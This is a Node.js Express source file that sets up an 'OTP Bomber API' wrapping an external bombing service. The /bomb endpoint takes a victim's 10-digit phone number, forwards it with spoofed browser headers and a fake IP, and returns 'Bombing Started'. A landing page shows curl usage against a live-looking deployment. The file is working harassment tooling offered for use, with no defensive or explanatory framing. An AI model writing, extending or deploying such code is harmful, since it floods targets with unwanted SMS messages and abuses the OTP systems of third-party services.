const express = require('express');
const axios = require('axios');

const app = express();
app.use(express.json());

app.get('/bomb', async (req, res) => {
    const phoneNumber = req.query.num;

    if (!phoneNumber) {
        return res.status(400).json({ "error": "Phone number is required" });
    }

    if (phoneNumber.length !== 10 || !/^\d+$/.test(phoneNumber)) {
        return res.status(400).json({ "error": "Invalid phone number format. Must be 10 digits." });
    }

    const targetUrl = "https://otpbomber-40jd.onrender.com/api/bomb";

    const headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Content-Type': 'application/json',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'origin': 'https://otpbomber-40jd.onrender.com',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://otpbomber-40jd.onrender.com/bomber',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'priority': 'u=1, i'
    };

    const data = {
        "phone": phoneNumber,
        "ip": "192.168.1.1",  // Default IP
        "iterations": 1  // Default iterations
    };

    try {
        const response = await axios.post(targetUrl, data, { headers: headers, timeout: 10000 });

        console.log(`Target API Response Status: ${response.status}`);
        console.log(`Target API Response: ${response.data.substring(0, 200)}...`);  // Log first 200 chars

        res.json({
            "message": "Bombing Started",
            "status": "success",
            "target": phoneNumber
        });

    } catch (error) {
        console.error(`Error: ${error.message}`);
        if (error.code === 'ECONNABORTED') {
            res.json({
                "message": "Bombing Started",
                "status": "timeout_but_initiated",
                "target": phoneNumber,
                "note": "Request timed out but bombing may have started"
            });
        } else {
            res.json({
                "message": "Bombing Started",
                "status": "error_but_initiated",
                "target": phoneNumber,
                "note": `Network error but bombing may have started: ${error.message}`
            });
        }
    }
});

app.get('/', (req, res) => {
    res.send(`
    <html>
        <head>
            <title>OTP Bomber API</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    max-width: 800px;
                    margin: 0 auto;
                    padding: 20px;
                    background-color: #f5f5f5;
                }
                .container {
                    background-color: white;
                    padding: 30px;
                    border-radius: 10px;
                    box-shadow: 0 0 10px rgba(0,0,0,0.1);
                }
                h1 {
                    color: #333;
                }
                code {
                    background-color: #eee;
                    padding: 2px 5px;
                    border-radius: 3px;
                }
                .example {
                    background-color: #f8f9fa;
                    padding: 15px;
                    border-left: 4px solid #007bff;
                    margin: 15px 0;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>OTP Bomber API</h1>
                <p>API is running. Use the following endpoint:</p>
                <div class="example">
                    <strong>Endpoint:</strong><br>
                    <code>GET https://upi-info-shaurya-yeu2.vercel.app/bomb?num=PHONE_NUMBER</code>
                </div>
                <div class="example">
                    <strong>Example:</strong><br>
                    <code>curl "https://upi-info-shaurya-yeu2.vercel.app/bomb?num=9876543210"</code>
                </div>
                <div class="example">
                    <strong>Response:</strong><br>
                    <pre>{
  "message": "Bombing Started",
  "status": "success",
  "target": "9876543210"
}</pre>
                </div>
                <p><strong>Note:</strong> Phone number must be 10 digits.</p>
            </div>
        </body>
    </html>
    `);
});

module.exports = app;
        
